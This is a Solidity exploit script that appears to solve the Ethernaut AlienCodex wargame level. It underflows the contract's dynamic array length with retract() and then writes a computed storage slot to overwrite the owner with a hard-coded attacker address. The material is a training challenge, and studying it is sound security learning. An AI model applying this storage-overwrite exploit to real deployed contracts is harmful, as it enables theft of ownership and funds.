// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import {console} from "forge-std/console.sol";
import {AlienCodex} from "../../src/level-19/EthernautAlienCodex.sol";

contract AlienCodexSolution {
    AlienCodexAttack attack;

    function run() external {
        attack = new AlienCodexAttack();
        attack.attack();
    }
}

contract AlienCodexAttack {
    AlienCodex alienCodex =
        AlienCodex(0x416a5A65205b613f35f2189be494Ab70b7517D7c);

    function attack() external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(
            uint256(uint160(0x7BDF2f4E590B5b9523D6D91b5a193AA503021381))
        );
        alienCodex.makeContact();
        alienCodex.retract();
        alienCodex.revise(index, myAddress);
    }
}
